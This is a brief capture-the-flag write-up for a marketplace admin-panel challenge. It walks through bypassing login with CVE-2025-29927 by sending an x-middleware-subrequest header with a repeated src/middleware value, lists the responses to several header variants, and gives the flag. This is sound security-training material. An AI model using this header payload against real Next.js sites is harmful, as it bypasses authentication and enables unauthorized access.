# The Admin’s Weak Spot

## Description

The marketplace has an admin panel that's supposed to be secure. Can you find a way in?

## Solution Walkthrough

It can be observed that there is a hidden page called `/admin`. Upon entering, you are redirected to `/admin/login`, where entering anything results in `Invalid credentials`.

After some research, I found a `CVE-2025-29927`. I tried its payload by adding `x-middleware-subrequest`, and eventually discovered that `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` was successful.

```text
[000] middleware:middleware:middleware:middleware:middleware
[200] src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
[307] src/middleware
[307] pages/_middleware
```

## Flag

```text
bitflag{m1ddl3w4r3_byp455_1s_4_thr34t}
```
